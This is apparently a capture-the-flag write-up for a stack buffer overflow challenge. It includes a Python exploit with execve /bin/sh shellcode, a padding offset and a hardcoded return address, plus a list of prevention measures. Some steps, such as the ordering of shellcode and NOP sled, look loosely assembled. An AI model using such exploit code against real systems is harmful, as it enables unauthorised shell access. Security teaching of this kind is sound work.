# Buffer Overflow Bonanza - Writeup

## Challenge Description
Classic buffer overflow. Overflow the buffer and get shell access.

## Solution

### Step 1: Identify the Vulnerability
The vulnerable code has an unbounded strcpy:
```c
char buffer[64];
strcpy(buffer, user_input);  // DANGEROUS!
```

### Step 2: Calculate Offset to Return Address
Use `gdb` to find the exact offset:
```bash
gdb ./vulnerable
(gdb) run AAAA
(gdb) disas main
(gdb) break main
(gdb) x/100x $sp
```

The return address is typically at offset **72 bytes**.

### Step 3: Craft the Exploit
```python
import struct
import subprocess

# Shellcode (execve /bin/sh)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Padding + shellcode + return address
offset = 72
nop_sled = b"\x90" * (offset - len(shellcode))
ret_address = struct.pack('<I', 0xffffd0e0)  # Address of our shellcode

payload = shellcode + nop_sled + ret_address

# Execute
p = subprocess.Popen(['./vulnerable'], stdin=subprocess.PIPE)
p.communicate(payload)
```

### Step 4: Get Shell
Once the return address is overwritten, execution jumps to your shellcode, spawning `/bin/sh`.

## Tools
- `gdb` - Debugging
- `objdump` - Disassembly
- `checksec` - Check security features
- `peda` - GDB plugin

## Flag
`MCTF{STACK_OVERFLOW_RCE_ACHIEVED}`

## Prevention
- Use `strncpy` instead of `strcpy`
- Enable ASLR (Address Space Layout Randomization)
- Use stack canaries
- Enable NX (No-Execute) bit
- Compile with `-fstack-protector`
- Use modern languages with bounds checking